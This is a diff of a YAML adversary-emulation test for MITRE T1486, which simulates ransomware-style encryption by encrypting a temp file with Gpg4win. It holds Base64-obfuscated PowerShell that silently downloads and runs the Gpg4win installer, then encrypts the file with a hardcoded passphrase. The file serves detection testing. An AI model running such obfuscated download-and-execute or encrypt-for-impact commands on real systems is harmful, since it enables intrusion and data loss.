@@ -1,20 +1,16 @@
-- id: e734889b-778c-5190-9847-7fa9fcc58171
+- requirements: []
   name: Soumaia ART Tests - Data Encrypted with GPG4Win
   description: Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.
   tactic: impact
-  technique:
-    attack_id: T1486
-    name: Data Encrypted for Impact
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKAB0AGUAcwB0AC0AcABhAHQAaAAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAgACgAeAA4ADYAKQBcAEcAbgB1AFAARwBcAGIAaQBuAFwAZwBwAGcALgBlAHgAZQAnACkAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAHQAZQBzAHQALgB0AHgAdAAiACAALQBWAGEAbAB1AGUAIAAiAHAAbwBwAHUAbABhAHQAaQBuAGcAIAB0AGgAaQBzACAAZgBpAGwAZQAgAHcAaQB0AGgAIABzAG8AbQBlACAAdABlAHgAdAAiACAAIAAjACAAQwByAGUAYQB0AGUAIAB0AGgAZQAgAHQAZQBzAHQALgB0AHgAdAAgAGYAaQBsAGUACgBOAGUAdwAtAEkAdABlAG0AIAAtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBpAG4AdgBvAGsAZQAtAHcAZQBiAHIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBmAGkAbABlAHMALgBnAHAAZwA0AHcAaQBuAC4AbwByAGcALwBnAHAAZwA0AHcAaQBuAC0ANAAuADEALgAwAC4AZQB4AGUAIgAgAC0AbwB1AHQAZgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABnAHAAZwBpAG4AcwB0AGEAbABsAC4AZQB4AGUAIgAKAGMAbQBkACAALwBjACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAGcAcABnAGkAbgBzAHQAYQBsAGwALgBlAHgAZQAiACAALwBTAAoA
-          }
-          Set-Content -Path "$env:temp\test.txt" -Value "populating this file with some text"  # Create the test.txt file again in case prereqs failed
-          cmd /c "`"C:\Program Files (x86)\GnuPG\bin\gpg.exe`" --passphrase 'SomeParaphraseBlah' --batch --yes -c `"$env:temp\test.txt`""
-        cleanup: |-
-          Remove-Item -Path "$env:temp\test.txt" -Force -ErrorAction SilentlyContinue
-          Remove-Item -Path "$env:temp\test.txt.gpg" -Force -ErrorAction SilentlyContinue
+  technique_id: T1486
+  technique_name: Data Encrypted for Impact
+  executors:
+  - cleanup:
+    - Remove-Item -Path "$env:temp\test.txt" -Force -ErrorAction SilentlyContinue; Remove-Item -Path "$env:temp\test.txt.gpg" -Force -ErrorAction SilentlyContinue
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKAB0AGUAcwB0AC0AcABhAHQAaAAgACcAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwAgACgAeAA4ADYAKQBcAEcAbgB1AFAARwBcAGIAaQBuAFwAZwBwAGcALgBlAHgAZQAnACkAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAdABlAG0AcABcAHQAZQBzAHQALgB0AHgAdAAiACAALQBWAGEAbAB1AGUAIAAiAHAAbwBwAHUAbABhAHQAaQBuAGcAIAB0AGgAaQBzACAAZgBpAGwAZQAgAHcAaQB0AGgAIABzAG8AbQBlACAAdABlAHgAdAAiACAAIAAjACAAQwByAGUAYQB0AGUAIAB0AGgAZQAgAHQAZQBzAHQALgB0AHgAdAAgAGYAaQBsAGUACgBOAGUAdwAtAEkAdABlAG0AIAAtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBpAG4AdgBvAGsAZQAtAHcAZQBiAHIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBmAGkAbABlAHMALgBnAHAAZwA0AHcAaQBuAC4AbwByAGcALwBnAHAAZwA0AHcAaQBuAC0ANAAuADEALgAwAC4AZQB4AGUAIgAgAC0AbwB1AHQAZgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABnAHAAZwBpAG4AcwB0AGEAbABsAC4AZQB4AGUAIgAKAGMAbQBkACAALwBjACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAGcAcABnAGkAbgBzAHQAYQBsAGwALgBlAHgAZQAiACAALwBTAAoA }; Set-Content -Path "$env:temp\test.txt" -Value "populating this file with some text"; cmd /c "`"C:\Program Files (x86)\GnuPG\bin\gpg.exe`" --passphrase 'SomeParaphraseBlah' --batch --yes -c `"$env:temp\test.txt`""
+  id: e734889b-778c-5190-9847-7fa9fcc58171
